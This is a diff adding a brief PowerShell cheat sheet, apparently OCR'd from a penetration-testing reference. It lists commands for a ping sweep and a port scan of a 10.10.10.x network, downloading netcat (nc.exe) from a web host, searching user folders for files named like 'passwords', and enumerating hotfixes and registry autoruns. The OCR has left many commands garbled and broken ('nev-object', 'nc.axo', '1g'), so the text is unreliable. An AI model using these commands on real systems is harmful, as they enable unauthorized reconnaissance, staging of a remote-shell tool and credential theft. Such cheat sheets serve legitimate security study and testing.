@@ -1,0 +1,19 @@
+Conduct a ping sweep:
+PS C:\> 1..255 | 1 (echo *10.10.10.5_*; ping -n 1 - 100 10.10.10.5_ | Select-String ttl)
+Conduct a port scan:
+PS C: \> 1..1024 | l (echo ((nev-object
+Net. Sockets.TcpClient) Connect (*10.10.10 10",$_)) "Port s_ is open!") 2>Snull
+Fetch a file via HTTP (wget in PowerShell):
+PS C: \> (Nev-Object
+System. Net.WebClient) .DownloadFile("http ://10.10.10.10/nc.axo", *nc.exe")
+Find all files with a particular name:
+PS C:\> Get-ChildIten "C: \Users)* - recurse
+-include *passwords*,txt
+Get a listing of all installed Microsoft Hotfixes:
+PS C: \ Get-HotFix
+Navigate the Windows registry:
+PS C:\> cd HKLM: \
+PS HKLM: \> 1g
+List programs set to start automatically in the registry:
+PS C:\> Get-ItemProperty HKLM: \SOFTWARE
+(Microsoft Windows \CurrentVersion\run
